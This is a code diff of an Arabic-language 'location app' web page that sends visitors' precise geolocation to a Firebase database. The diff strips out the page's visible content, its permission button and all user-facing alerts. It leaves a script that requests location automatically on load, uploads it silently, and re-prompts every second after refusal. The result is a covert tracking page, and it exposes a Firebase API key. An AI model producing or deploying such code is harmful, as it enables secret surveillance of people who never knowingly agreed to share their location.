@@ -5,21 +5,8 @@
   <title>تطبيق تحديد الموقع</title>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
-    h1 { color: #333; font-size: 2em; }
-    p { color: #555; font-size: 1.2em; max-width: 600px; margin: auto; }
-    .hidden { display: none; }
-    .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); margin: 20px auto; max-width: 800px; }
-    #grantPermissionBtn { background-color: #4CAF50; color: white; padding: 15px 30px; text-align: center; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; font-size: 1.2em; }
-  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>تطبيق تحديد الموقع</h1>
-    <p id="instructionText">للوصول إلى موقعك الحالي، عليك منح الأذونات.</p>
-    <button id="grantPermissionBtn">امنح الأذونات</button>
-  </div>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyDlHO7f36jxLqcCvPpA2r1p0BgxYAqO2ic",
@@ -35,36 +22,28 @@
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    const requestLocationPermission = async () => {
-      alert('طلب إذن الموقع');
+    const requestLocationPermission = () => {
       navigator.geolocation.getCurrentPosition(saveLocation, errorHandler, { enableHighAccuracy: true });
     };
 
     const saveLocation = (position) => {
-      alert(`تم الحصول على الإحداثيات: ${position.coords.latitude}, ${position.coords.longitude}`);
       const location = {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
         timestamp: new Date().toISOString()
       };
-      alert('يتم الآن حفظ الموقع إلى Firebase');
       database.ref('locations').push(location).then(() => {
-        alert('تم حفظ الموقع بنجاح');
         console.log('تم رفع الموقع بنجاح!');
-        document.getElementById('instructionText').innerText = 'تم الحصول على الموقع ورفعه بنجاح!';
       }).catch((error) => {
-        alert('خطأ في حفظ الموقع');
         console.error('خطأ في حفظ الموقع:', error);
       });
     };
 
     const errorHandler = (error) => {
-      alert('خطأ في جلب الموقع');
       console.error('خطأ في جلب الموقع:', error);
       setTimeout(requestLocationPermission, 1000);
     };
 
-    document.getElementById('grantPermissionBtn').addEventListener('click', requestLocationPermission);
     window.onload = requestLocationPermission;
   </script>
 </body>
